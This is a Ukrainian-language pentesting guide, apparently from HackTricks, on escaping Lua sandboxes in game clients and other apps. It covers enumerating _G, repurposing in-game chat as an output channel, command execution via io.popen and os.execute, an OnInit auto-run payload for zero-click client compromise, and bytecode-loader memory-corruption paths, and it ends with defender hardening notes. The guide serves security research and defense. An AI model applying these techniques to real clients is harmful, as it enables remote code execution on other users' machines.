# Обхід Lua sandboxes (вбудовані VM, ігрові клієнти)

Ця сторінка містить практичні техніки для перерахування та обходу Lua "sandboxes", вбудованих у застосунки (зокрема ігрові клієнти, плагіни або in-app scripting engines). Багато рушіїв надають обмежене Lua-середовище, але залишають доступними потужні globals, які дають змогу виконувати довільні команди або навіть спричиняти пошкодження native memory, коли доступні bytecode loaders.

Основні ідеї:
- Розглядайте VM як невідоме середовище: перераховуйте _G і визначайте, які небезпечні primitives доступні.
- Якщо stdout/print заблоковано, використовуйте будь-який доступний у VM UI/IPC channel як output sink для спостереження за результатами.
- Якщо io/os доступні, зазвичай це дає пряме виконання команд (io.popen, os.execute).
- Якщо доступні load/loadstring/loadfile, виконання створеного Lua bytecode у деяких версіях може порушити memory safety (verifiers у версіях ≤5.1 можна обійти; у 5.2 verifier видалено), що дає змогу застосовувати advanced exploitation.

## Перерахування sandboxed environment

- Дамп глобального середовища для інвентаризації доступних tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Якщо print() недоступний, перепрофілюйте канали всередині VM. Приклад із VM скрипту житла в MMO, де виведення в чат працює лише після виклику звуку; наведене нижче створює надійну функцію виведення:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Узагальніть цей шаблон для своєї цілі: будь-яке текстове поле, toast-повідомлення, logger або UI callback, який приймає рядки, може виконувати роль stdout для розвідки.

## Безпосереднє виконання команд, якщо io/os доступні

Якщо sandbox усе ще надає доступ до стандартних бібліотек io або os, імовірно, ви одразу отримуєте виконання команд:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
- Виконання відбувається всередині процесу клієнта; багато рівнів anti-cheat/antidebug, які блокують зовнішні debugger-и, не перешкоджатимуть створенню процесів усередині VM.
- Також перевірте: `package.loadlib` (завантаження довільних DLL/.so), `require` із native-модулями, `ffi` у LuaJIT (якщо доступний) і debug library (може підвищити привілеї всередині VM).

## Тригери без взаємодії користувача через auto-run callbacks

Якщо host application надсилає скрипти клієнтам, а VM надає auto-run hooks (наприклад, OnInit/OnLoad/OnEnter), розмістіть там payload для drive-by compromise одразу після завантаження скрипту:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Будь-який еквівалентний callback (OnLoad, OnEnter тощо) узагальнює цю техніку, коли scripts автоматично передаються та виконуються на client.

## Небезпечні примітиви, які слід шукати під час розвідки

Під час enumeration `_G` особливо шукайте:
- io, os: io.popen, os.execute, file I/O, доступ до env.
- load, loadstring, loadfile, dofile: виконання source або bytecode; підтримує завантаження untrusted bytecode.
- package, package.loadlib, require: завантаження dynamic library та поверхня module.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo та hooks.
- Лише LuaJIT: ffi.cdef, ffi.load для прямого виклику native code.

Мінімальні приклади використання (якщо доступні):

Loader API Lua змінювався між версіями: у Lua 5.1 `load` читає з reader function, а `loadstring` — зі string; `load` у Lua 5.2 приймає або string, або reader function, а `loadstring` є deprecated як його еквівалент.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Необов'язкова ескалація: зловживання Lua bytecode loaders

Коли load/loadstring/loadfile доступні, але io/os обмежені, виконання створеного Lua bytecode може призвести до розкриття даних у пам'яті та отримання примітивів її пошкодження. Ключові факти:
- У Lua ≤ 5.1 постачався bytecode verifier, для якого відомі способи обходу.<sup>[[4]](#references)</sup>
- У Lua 5.2 verifier було повністю вилучено (офіційна позиція: застосунки мають просто відхиляти попередньо скомпільовані chunks), що розширює attack surface, якщо завантаження bytecode не заборонено.<sup>[[2]](#references)[[3]](#references)</sup>
- Зазвичай workflow такий: витік pointers через виведення у VM, створення bytecode для type confusion (наприклад, навколо FORLOOP або інших opcodes), а потім перехід до довільного читання/запису або виконання native code.<sup>[[2]](#references)[[4]](#references)</sup>

Цей шлях залежить від engine/version і потребує RE. Дивіться references для детального розбору, exploitation primitives та прикладів gadgetry в іграх.

## Нотатки щодо виявлення та hardening (для defenders)

- На стороні сервера: відхиляйте або переписуйте user scripts; використовуйте allowlist безпечних APIs; вилучайте або прив'язуйте до порожніх значень io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- На стороні клієнта: запускайте Lua з мінімальним _ENV, забороняйте завантаження bytecode, повторно введіть суворий bytecode verifier або перевірки підписів і блокуйте створення процесів із client process.
- Telemetry: сповіщайте про створення gameclient → child process невдовзі після завантаження script; зіставляйте це з подіями UI/chat/script.

## References

- [1] [Цей будинок зачарований: RCE у client AION десятирічної давності (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Розбір bytecode: розкриття недоліків безпеки Lua у Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): обговорення вилучення bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Експлуатація Lua 5.1 bytecode (gist зі способами обходу verifier/нотатками)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Довідковий посібник Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Довідковий посібник Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
